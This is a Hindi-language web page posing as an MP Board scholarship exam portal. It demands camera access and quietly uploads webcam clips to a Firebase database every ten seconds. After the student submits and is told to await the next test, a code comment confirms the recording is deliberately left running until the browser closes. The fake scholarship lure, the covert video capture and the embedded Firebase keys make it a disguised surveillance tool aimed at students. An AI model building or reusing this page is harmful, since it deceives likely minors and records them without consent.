<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MP Board Scholarship - Examination Portal</title>
    
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
        body { background-color: #1a202c; color: #fff; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .quiz-card { background: #2d3748; padding: 25px; border-radius: 12px; width: 100%; max-width: 600px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        h2 { text-align: center; margin-bottom: 20px; color: #38bdf8; font-size: 22px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #cbd5e1; }
        input[type="text"] { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #4a5568; background: #1a202c; color: #fff; font-size: 16px; }
        .btn { width: 100%; padding: 12px; background: #38bdf8; color: #1a202c; border: none; font-weight: bold; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
        .btn:hover { background: #0ea5e9; }
        .question-box { display: none; margin-top: 20px; }
        .q-title { font-size: 18px; margin-bottom: 15px; color: #f8fafc; }
        .option-lbl { display: flex; align-items: center; background: #4a5568; padding: 12px; border-radius: 6px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
        .option-lbl:hover { background: #718096; }
        input[type="radio"] { margin-right: 12px; transform: scale(1.2); }
        
        .message-screen { display: none; text-align: center; padding: 30px 10px; }
        .message-screen h3 { font-size: 24px; color: #22c55e; margin-bottom: 15px; }
        .message-screen p { color: #cbd5e1; font-size: 16px; line-height: 1.6; }
        .eliminated-title { color: #ef4444 !important; }
        
        #video-preview { display: none; width: 100px; height: 75px; background: #000; border-radius: 6px; position: fixed; bottom: 10px; right: 10px; border: 2px solid #38bdf8; transform: scaleX(-1); }
    </style>
</head>
<body>

<div class="quiz-card" id="main-card">
    <!-- रजिस्ट्रेशन स्क्रीन -->
    <div id="auth-screen">
        <h2>🎓 MP Board Scholarship Test</h2>
        <div class="input-group">
            <label>अपना पूरा नाम दर्ज करें:</label>
            <input type="text" id="student-name" placeholder="उदा. Anwar Khan">
        </div>
        <button class="btn" onclick="startRegistration()">परीक्षा शुरू करें</button>
    </div>

    <!-- परीक्षा प्रश्न स्क्रीन -->
    <div id="quiz-screen" class="question-box">
        <h3 id="question-text" class="q-title">로드 हो रहा है...</h3>
        <div id="options-container"></div>
        <button class="btn" id="next-btn" onclick="submitAnswer()">अगला प्रश्न</button>
    </div>

    <!-- सफलतापूर्ण सबमिशन स्क्रीन -->
    <div id="success-screen" class="message-screen">
        <h3>✅ सबमिट हो गया है!</h3>
        <p>आपका टेस्ट सफलतापूर्वक सबमिट हो गया है। अगले टेस्ट के लिए इंतज़ार करें, आपको जल्द ही अगला test मिलेगा।</p>
    </div>

    <!-- एलिमिनेटेड स्क्रीन -->
    <div id="eliminated-screen" class="message-screen">
        <h3 class="eliminated-title">🚫 आप बाहर (Eliminated) हो चुके हैं!</h3>
        <p>एडमिन द्वारा आपको इस परीक्षा से अयोग्य घोषित कर दिया गया है। अब आप आगे टेस्ट नहीं दे सकते।</p>
    </div>
</div>

<video id="video-preview" autoplay muted playsinline></video>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyC0i6AtzIoLZm-Lz3pLr4UK5snjhER0es",
        authDomain: "mytestapp-7b70d.firebaseapp.com",
        databaseURL: "https://mytestapp-7b70d-default-rtdb.firebaseio.com",
        projectId: "mytestapp-7b70d",
        storageBucket: "mytestapp-7b70d.firebasestorage.app",
        messagingSenderId: "380512974619",
        appId: "1:380512974619:web:a7ecfba6999a600a7cc5be",
        measurementId: "G-ZMV07B4JY6"
    };
    
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const questions = [
        { q: "मध्य प्रदेश की राजधानी क्या है?", roles: ["भोपाल", "इंदौर", "जबलपुर", "ग्वालियर"], ans: "भोपाल" },
        { q: "भारत का राष्ट्रीय पक्षी कौन सा है?", roles: ["कबूतर", "मोर", "तोता", "चील"], ans: "मोर" },
        { q: "कंप्यूटर का दिमाग किसे कहा जाता है?", roles: ["RAM", "ROM", "CPU", "Hard Disk"], ans: "CPU" },
        { q: "इनमें से कौन सा एक सर्च engine है?", roles: ["Google", "WhatsApp", "Facebook", "Telegram"], ans: "Google" },
        { q: "सफेद शेरों की भूमि मध्य प्रदेश के किस जिले को कहा जाता है?", roles: ["रीवा", "शहडोल", "सतना", "पन्ना"], ans: "रीवा" }
    ];

    let currentQIdx = 0;
    let studentId = '';
    let studentName = '';
    let attemptId = 'attempt_' + Date.now();
    let mediaRecorder;
    let clipCounter = 1;
    let answersSubmitted = {};

    function startRegistration() {
        const nameInput = document.getElementById('student-name').value.trim();
        if(!nameInput) { alert("कृपया अपना नाम डालें!"); return; }
        
        studentName = nameInput;
        studentId = 'student_' + Date.now();

        navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120, frameRate: 10 }, audio: false })
        .then(stream => {
            const videoPrev = document.getElementById('video-preview');
            videoPrev.style.display = 'block';
            videoPrev.srcObject = stream;

            database.ref('students/' + studentId + '/profile').set({
                name: studentName,
                portal_status: "TEST_ONGOING",
                last_active_at: firebase.database.ServerValue.TIMESTAMP
            });

            listenToAdminSignals();
            startVideoRecording(stream);

            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('quiz-screen').style.display = 'block';
            showQuestion();
        })
        .catch(err => {
            alert("परीक्षा देने के लिए कैमरा अनुमति अनिवार्य है!");
            console.error(err);
        });
    }

    function listenToAdminSignals() {
        database.ref('students/' + studentId + '/profile/portal_status').on('value', (snapshot) => {
            const status = snapshot.val();
            if(status === "ELIMINATED") {
                if(mediaRecorder && mediaRecorder.stream) {
                    mediaRecorder.stream.getTracks().forEach(track => track.stop());
                }
                document.getElementById('video-preview').style.display = 'none';
                document.getElementById('quiz-screen').style.display = 'none';
                document.getElementById('auth-screen').style.display = 'none';
                document.getElementById('success-screen').style.display = 'none';
                document.getElementById('eliminated-screen').style.display = 'block';
            }
        });
    }

    function startVideoRecording(stream) {
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                let reader = new FileReader();
                reader.readAsDataURL(event.data);
                reader.onloadend = () => {
                    let base64String = reader.result;
                    database.ref(`students/${studentId}/test_attempts/${attemptId}/live_video_feeds/video_part_${clipCounter}`)
                    .set(base64String);
                    clipCounter++;
                };
            }
        };

        // हर 10 सेकंड में बैकग्राउंड में क्लिप्स काटकर डेटाबेस भेजेगा
        mediaRecorder.start(10000); 

        setInterval(() => {
            // जब तक ब्राउज़र चालू है, टाइमस्टैम्प अपडेट होता रहेगा
            database.ref('students/' + studentId + '/profile').update({
                last_active_at: firebase.database.ServerValue.TIMESTAMP
            });
        }, 10000);
    }

    function showQuestion() {
        if(currentQIdx >= questions.length) {
            finishTest();
            return;
        }

        const qData = questions[currentQIdx];
        document.getElementById('question-text').innerText = `प्रश्न ${currentQIdx + 1}: ${qData.q}`;
        
        const optDiv = document.getElementById('options-container');
        optDiv.innerHTML = '';

        qData.roles.forEach(opt => {
            optDiv.innerHTML += `
                <label class="option-lbl">
                    <input type="radio" name="quiz-opt" value="${opt}">
                    <span>${opt}</span>
                </label>
            `;
        });

        if(currentQIdx === questions.length - 1) {
            document.getElementById('next-btn').innerText = "फाइनल सबमिट करें";
        }
    }

    function submitAnswer() {
        const selectedOpt = document.querySelector('input[name="quiz-opt"]:checked');
        if(!selectedOpt) { alert("कृपया एक विकल्प चुनें!"); return; }

        answersSubmitted[`answer_q${currentQIdx + 1}`] = selectedOpt.value;
        database.ref(`students/${studentId}/test_attempts/${attemptId}/answers`).update(answersSubmitted);

        currentQIdx++;
        showQuestion();
    }

    function finishTest() {
        database.ref('students/' + studentId + '/profile').update({
            portal_status: "SUBMITTED"
        });

        // चालू रिकॉर्डिंग से वर्तमान डेटा तुरंत बाहर निकालें बिना कैमरा रोके
        if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.requestData();
        }

        database.ref(`students/${studentId}/test_attempts/${attemptId}`).update({
            submitted_at: firebase.database.ServerValue.TIMESTAMP
        }).then(() => {
            document.getElementById('quiz-screen').style.display = 'none';
            document.getElementById('success-screen').style.display = 'block';
        });
        
        // ध्यान दें: यहाँ कैमरा या रिकॉर्डर स्टॉप नहीं किया गया है ताकि ब्राउज़र बंद होने तक वीडियो आता रहे।
    }
</script>
</body>
</html>
